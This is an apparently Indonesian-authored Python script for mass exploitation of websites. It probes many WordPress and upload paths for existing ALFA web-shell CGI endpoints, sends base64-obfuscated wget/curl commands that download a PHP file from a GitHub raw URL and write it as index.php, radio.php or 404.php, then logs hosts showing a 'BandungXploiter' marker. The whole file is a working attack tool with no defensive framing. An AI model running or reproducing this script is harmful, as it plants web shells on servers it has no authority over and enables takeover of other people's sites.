import os
import requests
import threading
import time
import sys
import ctypes
import re
import urllib3
from multiprocessing.dummy import Pool, Lock
from bs4 import BeautifulSoup
from random import choice
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings()

# Global variable to track successful attempts
Good = 0

# User-Agent header
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
}

# List of paths to test
URL_PATHS = [
    '/alfacgiapi', '/ALFA_DATA/alfacgiapi', '/assets/alfacgiapi', '/assets/ALFA_DATA/alfacgiapi',
    '/upload/alfacgiapi', '/upload/ALFA_DATA/alfacgiapi', '/uploads/alfacgiapi', '/uploads/ALFA_DATA/alfacgiapi',
    '/assets/upload/alfacgiapi', '/assets/upload/ALFA_DATA/alfacgiapi', '/assets/uploads/alfacgiapi',
    '/assets/uploads/ALFA_DATA/alfacgiapi', '/wp-content/alfacgiapi', '/wp-content/ALFA_DATA/alfacgiapi',
    '/wp-content/uploads/alfacgiapi', '/wp-content/uploads/ALFA_DATA/alfacgiapi', '/wp-content/plugins/alfacgiapi',
    '/wp-content/plugins/ALFA_DATA/alfacgiapi', '/wp-content/themes/alfacgiapi', '/wp-content/themes/ALFA_DATA/alfacgiapi',
    '/wp-content/upgrade/alfacgiapi', '/wp-content/upgrade/ALFA_DATA/alfacgiapi', '/wp-content/updraft/alfacgiapi',
    '/wp-content/updraft/ALFA_DATA/alfacgiapi', '/wp-content/plugins/library/alfacgiapi', '/wp-content/plugins/library/ALFA_DATA/alfacgiapi',
    '/wp-admin/alfacgiapi', '/wp-admin/ALFA_DATA/alfacgiapi', '/wp-includes/alfacgiapi', '/wp-includes/ALFA_DATA/alfacgiapi',
    '/.well-known/alfacgiapi', '/.well-known/ALFA_DATA/alfacgiapi', '/.well-known/acme-challenge/alfacgiapi',
    '/.well-known/acme-challenge/ALFA_DATA/alfacgiapi', '/.well-known/pki-validation/alfacgiapi', '/.well-known/pki-validation/ALFA_DATA/alfacgiapi',
    '/.tmb/alfacgiapi', '/.tmb/ALFA_DATA/alfacgiapi', '/.quarantine/alfacgiapi', '/.quarantine/ALFA_DATA/alfacgiapi',
    '/cgi-bin/alfacgiapi', '/cgi-bin/ALFA_DATA/alfacgiapi', '/images/alfacgiapi', '/images/ALFA_DATA/alfacgiapi',
    '/components/alfacgiapi', '/components/ALFA_DATA/alfacgiapi', '/wordpress/alfacgiapi', '/wordpress/ALFA_DATA/alfacgiapi',
    '/wp/alfacgiapi', '/wp/ALFA_DATA/alfacgiapi', '/blog/alfacgiapi', '/blog/ALFA_DATA/alfacgiapi', '/new/alfacgiapi',
    '/new/ALFA_DATA/alfacgiapi', '/old/alfacgiapi', '/old/ALFA_DATA/alfacgiapi', '/backup/alfacgiapi', '/backup/ALFA_DATA/alfacgiapi'
]

# Command payloads to execute
COMMANDS = [
    'd2dldCAtcU8gaW5kZXgucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vdnJ0aG5rbmcvY29rL21haW4vdXA=',
    'Y3VybCAtTHMgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL292cnRobmtuZy9jb2svbWFpbi91cCB8IHRlZSAtYSBpbmRleC5waHA=',
    'd2dldCAtcU8gcmFkaW8ucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vdnJ0aG5rbmcvY29rL21haW4vdXA=',
    'Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb3ZydGhua25nL2Nvay9tYWluL3VwIC1vIHJhZGlvLnBocA==',
    'Y3VybCAtTHMgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL292cnRobmtuZy9jb2svbWFpbi91cCB8IHRlZSAtYSA0MDQucGhw',
    'd2dldCAtcU8gNDA0LnBocCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb3ZydGhua25nL2Nvay9tYWluL3Vw'
]

# Function to perform the check
def alfa(i):
    global Good
    x = requests.session()
    for path in URL_PATHS:
        try:
            base_url = f"http://{i}{path}"
            urls = [
                f"{base_url}/perl.alfa",
                f"{base_url}/bash.alfa",
                f"{base_url}/py.alfa"
            ]
            checks = [
                f"{base_url}/index.php?bx=0e215962017",
                f"{base_url}/radio.php?bx=0e215962017",
                f"{base_url}/404.php?bx=0e215962017"
            ]
            
            # Send command payloads to each URL
            for url in urls:
                for cmd in COMMANDS:
                    x.post(url, headers=HEADERS, data={'cmd': cmd}, timeout=15)
            
            # Check for successful execution
            for check in checks:
                req = x.get(check, headers=HEADERS, timeout=15)
                if "BandungXploiter" in req.text:
                    Good += 1
                    print(f"{Fore.GREEN}[chris] {i} << Found ALFA RCE")
                    with open("../perlalfa.txt", "a") as file:
                        file.write(f"{check}\n")
                    return
            
            print(f"{Fore.RED}[chris] {i} << Not Found ALFA RCE")
        except Exception:
            print(f"{Fore.RED}[chris] {i} << Not Found ALFA RCE")

# Read targets from file
def read_targets(file_path):
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f.readlines()]
    except Exception as e:
        print(f"Error reading file: {e}")
        sys.exit(1)

# Main function
if __name__ == "__main__":
    target_file = input("Masukkan list: ")
    full_path = os.path.join("..", target_file)
    targets = read_targets(full_path)
    
    with Pool(10) as pool:
        pool.map(alfa, targets)